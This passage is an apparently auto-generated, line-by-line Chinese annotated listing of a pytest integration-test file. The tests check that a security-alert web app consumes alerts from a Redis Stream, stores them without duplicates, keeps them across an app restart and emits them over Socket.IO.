| 333 | 函数调用：执行已有函数/方法完成当前步骤。 | `    print()` |
| 334 | 函数调用：执行已有函数/方法完成当前步骤。 | `    print(` |
| 335 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "说明: 场景 10（Web 重启查历史告警）请运行: python -m pytest tests/e2e/test_v1_acceptance.py -q"` |
| 336 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 337 | 返回结果：把处理后的值交回调用方。 | `    return 1 if failed else 0` |
| 338 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 339 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 340 | 条件判断：满足条件时进入对应分支。 | `if __name__ == "__main__":` |
| 341 | 抛出异常：主动报告不可继续的错误。 | `    raise SystemExit(main())` |

## `tests/test_alert_stream_redis.py`

- 类型：测试
- 行数：297

| 行号 | 备注 | 原始代码 |
|---:|---|---|
| 1 | 文档字符串：说明当前模块、类或函数的职责。 | `"""Redis Stream \`\`guardian:alerts\`\` 消费链路与 Socket.IO 集成测试（需本机 Redis）。"""` |
| 2 | 兼容性导入：启用较新的 Python 语义。 | `from __future__ import annotations` |
| 3 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 4 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import os` |
| 5 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import time` |
| 6 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import uuid` |
| 7 | 导入对象：从指定模块引入类、函数或常量。 | `from pathlib import Path` |
| 8 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 9 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import pytest` |
| 10 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 11 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 12 | 函数定义：声明 `_redis_ping` 的输入、处理逻辑和返回结果。 | `def _redis_ping() -> bool:` |
| 13 | 异常保护：尝试执行可能失败的逻辑。 | `    try:` |
| 14 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `        import redis` |
| 15 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 16 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        r = redis.Redis(` |
| 17 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            host=os.environ.get("REDIS_HOST", "localhost"),` |
| 18 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            port=int(os.environ.get("REDIS_PORT", "6379")),` |
| 19 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            db=int(os.environ.get("REDIS_TEST_DB", "15")),` |
| 20 | 占位语句：保持语法完整但当前不执行操作。 | `            password=os.environ.get("REDIS_PASSWORD") or None,` |
| 21 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            socket_connect_timeout=1.5,` |
| 22 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            decode_responses=True,` |
| 23 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 24 | 返回结果：把处理后的值交回调用方。 | `        return bool(r.ping())` |
| 25 | 异常处理：捕获错误并执行降级或记录逻辑。 | `    except Exception:` |
| 26 | 返回结果：把处理后的值交回调用方。 | `        return False` |
| 27 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 28 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 29 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `pytestmark = pytest.mark.integration` |
| 30 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 31 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 32 | 装饰器：为下面的函数或类附加框架行为。 | `@pytest.fixture()` |
| 33 | 函数定义：声明 `stream_env` 的输入、处理逻辑和返回结果。 | `def stream_env(monkeypatch, tmp_path: Path) -> dict:` |
| 34 | 文档字符串：说明当前模块、类或函数的职责。 | `    """独立 stream + 文件库，避免污染默认 \`\`guardian:alerts\`\`。"""` |
| 35 | 条件判断：满足条件时进入对应分支。 | `    if not _redis_ping():` |
| 36 | 函数调用：执行已有函数/方法完成当前步骤。 | `        pytest.skip("Redis 不可用（跳过 Stream 集成测试）")` |
| 37 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    suffix = uuid.uuid4().hex[:10]` |
| 38 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    stream = f"guardian:alerts:test:{suffix}"` |
| 39 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    group = f"guardian:web-test:{suffix}"` |
| 40 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    db_file = tmp_path / "stream_test.db"` |
| 41 | 函数调用：执行已有函数/方法完成当前步骤。 | `    monkeypatch.setenv("FLASK_ENV", "testing")` |
| 42 | 函数调用：执行已有函数/方法完成当前步骤。 | `    monkeypatch.setenv("DATABASE_URL", f"sqlite:///{db_file.as_posix()}")` |
| 43 | 函数调用：执行已有函数/方法完成当前步骤。 | `    monkeypatch.setenv("SECRET_KEY", "test-secret-key-which-is-at-least-32b-long")` |
| 44 | 函数调用：执行已有函数/方法完成当前步骤。 | `    monkeypatch.setenv("ADMIN_USERNAME", "admin")` |
| 45 | 函数调用：执行已有函数/方法完成当前步骤。 | `    monkeypatch.setenv("ADMIN_PASSWORD", "changeme")` |
| 46 | 函数调用：执行已有函数/方法完成当前步骤。 | `    monkeypatch.setenv("ALERT_STREAM_CONSUMER_AUTOSTART", "false")` |
| 47 | 函数调用：执行已有函数/方法完成当前步骤。 | `    monkeypatch.setenv("GUARDIAN_ALERT_STREAM", stream)` |
| 48 | 函数调用：执行已有函数/方法完成当前步骤。 | `    monkeypatch.setenv("GUARDIAN_ALERT_STREAM_GROUP", group)` |
| 49 | 返回结果：把处理后的值交回调用方。 | `    return {"stream": stream, "group": group, "db_file": db_file}` |
| 50 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 51 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 52 | 函数定义：声明 `_redis_client_for_tests` 的输入、处理逻辑和返回结果。 | `def _redis_client_for_tests():` |
| 53 | 导入对象：从指定模块引入类、函数或常量。 | `    from src.utils.redis_client import RedisClient` |
| 54 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 55 | 返回结果：把处理后的值交回调用方。 | `    return RedisClient(` |
| 56 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        host=os.environ.get("REDIS_HOST", "localhost"),` |
| 57 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        port=int(os.environ.get("REDIS_PORT", "6379")),` |
| 58 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        db=int(os.environ.get("REDIS_TEST_DB", "15")),` |
| 59 | 占位语句：保持语法完整但当前不执行操作。 | `        password=os.environ.get("REDIS_PASSWORD") or "",` |
| 60 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 61 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 62 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 63 | 函数定义：声明 `test_stream_consumer_persists_and_acks` 的输入、处理逻辑和返回结果。 | `def test_stream_consumer_persists_and_acks(stream_env, monkeypatch):` |
| 64 | 导入对象：从指定模块引入类、函数或常量。 | `    from web.alert_stream_consumer import GuardianAlertStreamConsumer` |
| 65 | 导入对象：从指定模块引入类、函数或常量。 | `    from web.app import create_app` |
| 66 | 导入对象：从指定模块引入类、函数或常量。 | `    from web.database import db` |
| 67 | 导入对象：从指定模块引入类、函数或常量。 | `    from web.models import Alert` |
| 68 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 69 | 函数调用：执行已有函数/方法完成当前步骤。 | `    app, socketio = create_app()` |
| 70 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    app.config["TESTING"] = True` |
| 71 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 72 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    rc = _redis_client_for_tests()` |
| 73 | 条件判断：满足条件时进入对应分支。 | `    if not rc.is_available:` |
| 74 | 函数调用：执行已有函数/方法完成当前步骤。 | `        pytest.skip("RedisClient 未连上 Redis")` |
| 75 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 76 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    stream = stream_env["stream"]` |
| 77 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    group = stream_env["group"]` |
| 78 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    alert_id = str(uuid.uuid4())` |
| 79 | 函数调用：执行已有函数/方法完成当前步骤。 | `    rc.stream_ensure_group(stream, group)` |
| 80 | 函数调用：执行已有函数/方法完成当前步骤。 | `    rc.stream_add(` |
| 81 | 代码语句：参与当前文件的业务流程或数据处理。 | `        stream,` |
| 82 | 代码语句：参与当前文件的业务流程或数据处理。 | `        {` |
| 83 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "alert_id": alert_id,` |
| 84 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "timestamp": "2026-01-01T12:00:00+00:00",` |
| 85 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "type": "dos",` |
| 86 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "level": "high",` |
| 87 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "confidence": 0.91,` |
| 88 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "source_ip": "198.51.100.10",` |
| 89 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "details": "integration stream",` |
| 90 | 代码语句：参与当前文件的业务流程或数据处理。 | `        },` |
| 91 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 92 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 93 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    consumer = GuardianAlertStreamConsumer(` |
| 94 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        app=app,` |
| 95 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        redis_client=rc,` |
| 96 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        socketio=socketio,` |
| 97 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        stream_key=stream,` |
| 98 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        group_name=group,` |
| 99 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        consumer_name="pytest-consumer",` |
| 100 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        idle_block_ms=200,` |
| 101 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 102 | 函数调用：执行已有函数/方法完成当前步骤。 | `    consumer.start()` |
| 103 | 异常保护：尝试执行可能失败的逻辑。 | `    try:` |
| 104 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        deadline = time.time() + 15.0` |
| 105 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        row = None` |
| 106 | 循环：在条件成立期间重复执行逻辑。 | `        while time.time() < deadline:` |
| 107 | 上下文管理：自动管理资源打开与释放。 | `            with app.app_context():` |
| 108 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                row = db.session.get(Alert, alert_id)` |
| 109 | 条件判断：满足条件时进入对应分支。 | `            if row is not None:` |
| 110 | 跳出循环：提前结束当前循环。 | `                break` |
| 111 | 函数调用：执行已有函数/方法完成当前步骤。 | `            time.sleep(0.05)` |
| 112 | 断言：验证测试或运行时假设是否成立。 | `        assert row is not None` |
| 113 | 断言：验证测试或运行时假设是否成立。 | `        assert row.threat_type == "dos"` |
| 114 | 断言：验证测试或运行时假设是否成立。 | `        assert row.external_id == alert_id` |
| 115 | 断言：验证测试或运行时假设是否成立。 | `        assert int(rc.stream_pending(stream, group)) == 0` |
| 116 | 收尾逻辑：无论是否异常都会执行清理。 | `    finally:` |
| 117 | 函数调用：执行已有函数/方法完成当前步骤。 | `        consumer.stop()` |
| 118 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 119 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 120 | 函数定义：声明 `test_stream_duplicate_messages_idempotent` 的输入、处理逻辑和返回结果。 | `def test_stream_duplicate_messages_idempotent(stream_env):` |
| 121 | 导入对象：从指定模块引入类、函数或常量。 | `    from web.alert_stream_consumer import GuardianAlertStreamConsumer` |
| 122 | 导入对象：从指定模块引入类、函数或常量。 | `    from web.app import create_app` |
| 123 | 导入对象：从指定模块引入类、函数或常量。 | `    from web.database import db` |
| 124 | 导入对象：从指定模块引入类、函数或常量。 | `    from web.models import Alert` |
| 125 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 126 | 函数调用：执行已有函数/方法完成当前步骤。 | `    app, socketio = create_app()` |
| 127 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    rc = _redis_client_for_tests()` |
| 128 | 条件判断：满足条件时进入对应分支。 | `    if not rc.is_available:` |
| 129 | 函数调用：执行已有函数/方法完成当前步骤。 | `        pytest.skip("RedisClient 未连上 Redis")` |
| 130 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 131 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    stream = stream_env["stream"]` |
| 132 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    group = stream_env["group"]` |
| 133 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    alert_id = str(uuid.uuid4())` |
| 134 | 函数调用：执行已有函数/方法完成当前步骤。 | `    rc.stream_ensure_group(stream, group)` |
| 135 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    fields = {` |
| 136 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "alert_id": alert_id,` |
| 137 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "timestamp": "2026-01-02T08:00:00+00:00",` |
| 138 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "type": "xss",` |
| 139 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "level": "medium",` |
| 140 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "confidence": 0.7,` |
| 141 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "source_ip": "203.0.113.5",` |
| 142 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "details": "dup test",` |
| 143 | 代码语句：参与当前文件的业务流程或数据处理。 | `    }` |
| 144 | 函数调用：执行已有函数/方法完成当前步骤。 | `    rc.stream_add(stream, dict(fields))` |
| 145 | 函数调用：执行已有函数/方法完成当前步骤。 | `    rc.stream_add(stream, dict(fields))` |
| 146 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 147 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    consumer = GuardianAlertStreamConsumer(` |
| 148 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        app=app,` |
| 149 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        redis_client=rc,` |
| 150 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        socketio=socketio,` |
| 151 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        stream_key=stream,` |
| 152 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        group_name=group,` |
| 153 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        consumer_name="pytest-dup",` |
| 154 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        idle_block_ms=200,` |
| 155 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 156 | 函数调用：执行已有函数/方法完成当前步骤。 | `    consumer.start()` |
| 157 | 异常保护：尝试执行可能失败的逻辑。 | `    try:` |
| 158 | 函数调用：执行已有函数/方法完成当前步骤。 | `        time.sleep(2.5)` |
| 159 | 上下文管理：自动管理资源打开与释放。 | `        with app.app_context():` |
| 160 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            cnt = db.session.query(Alert).filter(Alert.id == alert_id).count()` |
| 161 | 断言：验证测试或运行时假设是否成立。 | `        assert cnt == 1` |
| 162 | 断言：验证测试或运行时假设是否成立。 | `        assert int(rc.stream_pending(stream, group)) == 0` |
| 163 | 收尾逻辑：无论是否异常都会执行清理。 | `    finally:` |
| 164 | 函数调用：执行已有函数/方法完成当前步骤。 | `        consumer.stop()` |
| 165 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 166 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 167 | 函数定义：声明 `test_api_survives_app_recreate_same_database` 的输入、处理逻辑和返回结果。 | `def test_api_survives_app_recreate_same_database(stream_env):` |
| 168 | 文档字符串：说明当前模块、类或函数的职责。 | `    """模拟 Web 重启：新进程/新 app 实例 + 同一 SQLite 文件仍能查历史。"""` |
| 169 | 导入对象：从指定模块引入类、函数或常量。 | `    from web.alert_stream_consumer import GuardianAlertStreamConsumer` |
| 170 | 导入对象：从指定模块引入类、函数或常量。 | `    from web.app import create_app` |
| 171 | 导入对象：从指定模块引入类、函数或常量。 | `    from web.database import db` |
| 172 | 导入对象：从指定模块引入类、函数或常量。 | `    from web.models import Alert` |
| 173 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 174 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    alert_id = str(uuid.uuid4())` |
| 175 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 176 | 函数定义：声明 `_make_pair` 的输入、处理逻辑和返回结果。 | `    def _make_pair():` |
| 177 | 函数调用：执行已有函数/方法完成当前步骤。 | `        a, sio = create_app()` |
| 178 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        a.config["TESTING"] = True` |
| 179 | 返回结果：把处理后的值交回调用方。 | `        return a, sio` |
| 180 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 181 | 函数调用：执行已有函数/方法完成当前步骤。 | `    app1, socketio1 = _make_pair()` |
| 182 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    rc = _redis_client_for_tests()` |
| 183 | 条件判断：满足条件时进入对应分支。 | `    if not rc.is_available:` |
| 184 | 函数调用：执行已有函数/方法完成当前步骤。 | `        pytest.skip("RedisClient 未连上 Redis")` |
| 185 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 186 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    stream = stream_env["stream"]` |
| 187 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    group = stream_env["group"]` |
| 188 | 函数调用：执行已有函数/方法完成当前步骤。 | `    rc.stream_ensure_group(stream, group)` |
| 189 | 函数调用：执行已有函数/方法完成当前步骤。 | `    rc.stream_add(` |
| 190 | 代码语句：参与当前文件的业务流程或数据处理。 | `        stream,` |
| 191 | 代码语句：参与当前文件的业务流程或数据处理。 | `        {` |
| 192 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "alert_id": alert_id,` |
| 193 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "timestamp": "2026-03-01T10:00:00+00:00",` |
| 194 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "type": "port_scan",` |
| 195 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "level": "low",` |
| 196 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "confidence": 0.5,` |
| 197 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "source_ip": "192.0.2.1",` |
| 198 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "details": "restart test",` |
| 199 | 代码语句：参与当前文件的业务流程或数据处理。 | `        },` |
| 200 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 201 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    c1 = GuardianAlertStreamConsumer(` |
| 202 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        app=app1,` |
| 203 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        redis_client=rc,` |
| 204 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        socketio=socketio1,` |
| 205 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        stream_key=stream,` |
| 206 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        group_name=group,` |
| 207 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        consumer_name="pytest-restart",` |
| 208 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        idle_block_ms=200,` |
| 209 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 210 | 函数调用：执行已有函数/方法完成当前步骤。 | `    c1.start()` |
| 211 | 异常保护：尝试执行可能失败的逻辑。 | `    try:` |
| 212 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        deadline = time.time() + 15.0` |
| 213 | 循环：在条件成立期间重复执行逻辑。 | `        while time.time() < deadline:` |
| 214 | 上下文管理：自动管理资源打开与释放。 | `            with app1.app_context():` |
| 215 | 条件判断：满足条件时进入对应分支。 | `                if db.session.get(Alert, alert_id):` |
| 216 | 跳出循环：提前结束当前循环。 | `                    break` |
| 217 | 函数调用：执行已有函数/方法完成当前步骤。 | `            time.sleep(0.05)` |
| 218 | 上下文管理：自动管理资源打开与释放。 | `        with app1.app_context():` |
| 219 | 断言：验证测试或运行时假设是否成立。 | `            assert db.session.get(Alert, alert_id) is not None` |
| 220 | 收尾逻辑：无论是否异常都会执行清理。 | `    finally:` |
| 221 | 函数调用：执行已有函数/方法完成当前步骤。 | `        c1.stop()` |
| 222 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 223 | 注释：解释下面或当前这段代码的设计意图。 | `    # 新 Flask 应用实例，复用同一 DATABASE_URL` |
| 224 | 函数调用：执行已有函数/方法完成当前步骤。 | `    app2, _ = _make_pair()` |
| 225 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    client = app2.test_client()` |
| 226 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    login = client.post(` |
| 227 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "/api/auth/login",` |
| 228 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        json={"username": "admin", "password": "changeme"},` |
| 229 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 230 | 断言：验证测试或运行时假设是否成立。 | `    assert login.status_code == 200` |
| 231 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    token = login.get_json()["access_token"]` |
| 232 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    headers = {"Authorization": f"Bearer {token}"}` |
| 233 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    resp = client.get("/api/alerts", headers=headers)` |
| 234 | 断言：验证测试或运行时假设是否成立。 | `    assert resp.status_code == 200` |
| 235 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    data = resp.get_json()` |
| 236 | 断言：验证测试或运行时假设是否成立。 | `    assert any(item["id"] == alert_id for item in data)` |
| 237 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 238 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 239 | 函数定义：声明 `test_socketio_receives_alert_after_stream_ingest` 的输入、处理逻辑和返回结果。 | `def test_socketio_receives_alert_after_stream_ingest(stream_env):` |
| 240 | 导入对象：从指定模块引入类、函数或常量。 | `    from flask_socketio import SocketIOTestClient` |
| 241 | 导入对象：从指定模块引入类、函数或常量。 | `    from web.alert_stream_consumer import GuardianAlertStreamConsumer` |
| 242 | 导入对象：从指定模块引入类、函数或常量。 | `    from web.app import create_app` |
| 243 | 导入对象：从指定模块引入类、函数或常量。 | `    from web.database import db` |
| 244 | 导入对象：从指定模块引入类、函数或常量。 | `    from web.models import Alert` |
| 245 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 246 | 函数调用：执行已有函数/方法完成当前步骤。 | `    app, socketio = create_app()` |
| 247 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    app.config["TESTING"] = True` |
| 248 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    sio_client: SocketIOTestClient = socketio.test_client(app, flask_test_client=app.test_client())` |
| 249 | 断言：验证测试或运行时假设是否成立。 | `    assert sio_client.is_connected()` |
| 250 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    rc = _redis_client_for_tests()` |
| 251 | 条件判断：满足条件时进入对应分支。 | `    if not rc.is_available:` |
| 252 | 函数调用：执行已有函数/方法完成当前步骤。 | `        pytest.skip("RedisClient 未连上 Redis")` |
| 253 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 254 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    stream = stream_env["stream"]` |
| 255 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    group = stream_env["group"]` |
| 256 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    alert_id = str(uuid.uuid4())` |
| 257 | 函数调用：执行已有函数/方法完成当前步骤。 | `    rc.stream_ensure_group(stream, group)` |
| 258 | 函数调用：执行已有函数/方法完成当前步骤。 | `    rc.stream_add(` |
| 259 | 代码语句：参与当前文件的业务流程或数据处理。 | `        stream,` |
| 260 | 代码语句：参与当前文件的业务流程或数据处理。 | `        {` |
| 261 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "alert_id": alert_id,` |
| 262 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "timestamp": "2026-04-01T15:30:00+00:00",` |
| 263 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "type": "malware_c2",` |
| 264 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "level": "critical",` |
| 265 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "confidence": 0.99,` |
| 266 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "source_ip": "198.51.100.77",` |
| 267 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "details": "socket test",` |
| 268 | 代码语句：参与当前文件的业务流程或数据处理。 | `        },` |
| 269 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 270 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 271 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    consumer = GuardianAlertStreamConsumer(` |
| 272 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        app=app,` |
| 273 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        redis_client=rc,` |
| 274 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        socketio=socketio,` |
| 275 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        stream_key=stream,` |
| 276 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        group_name=group,` |
| 277 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        consumer_name="pytest-sio",` |
| 278 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        idle_block_ms=200,` |
| 279 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 280 | 函数调用：执行已有函数/方法完成当前步骤。 | `    consumer.start()` |
| 281 | 异常保护：尝试执行可能失败的逻辑。 | `    try:` |
| 282 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        deadline = time.time() + 15.0` |
| 283 | 循环：在条件成立期间重复执行逻辑。 | `        while time.time() < deadline:` |
| 284 | 上下文管理：自动管理资源打开与释放。 | `            with app.app_context():` |
| 285 | 条件判断：满足条件时进入对应分支。 | `                if db.session.get(Alert, alert_id):` |
| 286 | 跳出循环：提前结束当前循环。 | `                    break` |
| 287 | 函数调用：执行已有函数/方法完成当前步骤。 | `            time.sleep(0.05)` |
| 288 | 函数调用：执行已有函数/方法完成当前步骤。 | `        time.sleep(0.3)` |
| 289 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        received = sio_client.get_received()` |
| 290 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        names = [entry.get("name") for entry in received]` |
| 291 | 断言：验证测试或运行时假设是否成立。 | `        assert "alert" in names` |
| 292 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        payloads = [` |
| 293 | 函数调用：执行已有函数/方法完成当前步骤。 | `            e["args"][0] for e in received if e.get("name") == "alert" and e.get("args")` |
| 294 | 代码语句：参与当前文件的业务流程或数据处理。 | `        ]` |
| 295 | 断言：验证测试或运行时假设是否成立。 | `        assert any(p.get("id") == alert_id for p in payloads)` |
| 296 | 收尾逻辑：无论是否异常都会执行清理。 | `    finally:` |
| 297 | 函数调用：执行已有函数/方法完成当前步骤。 | `        consumer.stop()` |

## `tests/test_collectors.py`

- 类型：测试
- 行数：476

| 行号 | 备注 | 原始代码 |
|---:|---|---|
